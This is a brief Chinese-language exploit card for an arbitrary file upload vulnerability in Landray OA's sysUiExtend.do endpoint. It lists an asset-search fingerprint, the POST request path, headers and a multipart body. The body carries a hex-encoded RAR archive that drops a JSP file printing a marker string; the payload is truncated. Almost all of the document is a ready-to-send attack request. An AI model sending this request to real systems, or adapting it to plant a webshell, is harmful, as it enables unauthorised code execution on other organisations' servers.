# 蓝凌OAsysUiExtend.do任意文件上传漏洞

- **系统**：蓝凌OAsysUiExtend.do　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="Landray-OA系统"`
- **请求**：`POST /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=getThemeInfo HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------260…`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
-----------------------------260140030128010173621878123124
Content-Disposition: form-data; name="file"; filename="dudesite.rar"
Content-Type: application/octet-stream
$<Stream>0x526172211A0700CF907300000D0000000000000005AD7420902B00260000002A00000002AB984EA5696D3D581D3306002000000075692E696E6900B0EF88480D0108FE8CB7B255254C5B3FE4A601880FF1124111D9F359070482E9077A6EA9C68FCAFAFD20E4D674209031001D0000001D00000002563F7118856D3D581D300C002000000064756465736974652E6A737000B01A74443C25206F75742E7072696E746C6E2822647564657369746522293B253EC43D7B00400700</Stream>$
-----------------------------260140030…（脚本共 623 字，完整版见原文）
```
- **预期**：200　|　—